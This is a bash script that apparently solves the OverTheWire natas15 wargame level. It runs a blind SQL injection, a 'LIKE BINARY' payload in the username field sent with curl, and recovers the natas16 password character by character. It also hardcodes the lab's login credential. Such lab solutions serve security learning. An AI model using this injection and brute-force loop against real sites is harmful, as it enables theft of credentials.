#!/usr/bin/bash

# Constants
url=http://natas15.natas.labs.overthewire.org/index.php
dict="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
sql='?username=natas16" AND password LIKE BINARY "%'
encSql="?username=natas16%22%20AND%20password%20LIKE%20BINARY%20%22%25"

# Creates an Array based on the dictionary
split=$(echo "${dict}" | sed -rn 's/(.)/\1\n/gp')
arr=(${split})

# Array to store found letters.  http://tldp.org/LDP/Bash-Beginners-Guide/html/sect_10_02.html
found=()

echo "Guessing characters that the password contains..."
for i in "${arr[@]}"
do
   # Requests if the pass contains $i letter
   res=$(curl -s -u natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J ${url}/ --data-urlencode "username=natas16\" AND password LIKE BINARY \"%${i}%")
   # Discover if the word exists.
   if [[ $res = *"This user exists."* ]]; then
      found+=("$i")
      echo "Found characters: ${found[@]}"
   fi
done

# Prints the number of different characters
echo "The password contains ${#found[@]} different Characters."

# The password guessed
pass=""
echo "Guessing the password..."

# For each index from 1 to password length
for idx in `seq 1 32`;
do

# For each word in found array
for i in "${found[@]}"
do
   # Does another request... Tries to guess the password
   echo "param: username=natas16\" AND password LIKE BINARY \"${pass}${i}%"
   res=$(curl -s -u natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J ${url}/ --data-urlencode "username=natas16\" AND password LIKE BINARY \"${pass}${i}%")
   # If the password starts with the substring
   if [[ $res = *"This user exists."* ]]; then
      pass="${pass}${i}"
      break
   fi
done
# Echo the password found
echo "*** Found characters: ${pass}"
done

echo "Done guessing. Password for natas16 is ${pass}."
